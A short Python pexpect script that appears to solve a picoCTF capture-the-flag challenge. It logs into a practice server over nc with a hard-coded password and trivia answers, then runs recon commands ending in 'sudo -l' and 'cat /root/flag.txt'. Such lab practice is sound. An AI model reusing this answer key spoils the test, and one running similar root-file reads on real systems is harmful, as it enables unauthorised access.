#!/usr/bin/env python3
import pexpect
import sys
import time

child = pexpect.spawn('nc tethys.picoctf.net 59853', encoding='utf-8', timeout=30)
child.logfile = sys.stdout

# Wait for password prompt
child.expect('password?')
child.sendline('My_Passw@rd_@1234')
time.sleep(1)

# Answer conference question
child.expect('world?')
child.sendline('DEFCON')
time.sleep(1)

# Answer hacker question
child.expect('it?')
child.sendline('John Draper')
time.sleep(2)

# Just wait and then start sending commands
print("\n=== SENDING COMMANDS ===\n")

# Execute commands
commands = [
    'id',
    'whoami',
    'pwd',
    'ls -la',
    'sudo -l',
    'cat /root/flag.txt',
]

for cmd in commands:
    print(f"\n>>> Executing: {cmd}")
    child.sendline(cmd)
    time.sleep(2)
    
time.sleep(5)
print("\n=== DONE ===\n")
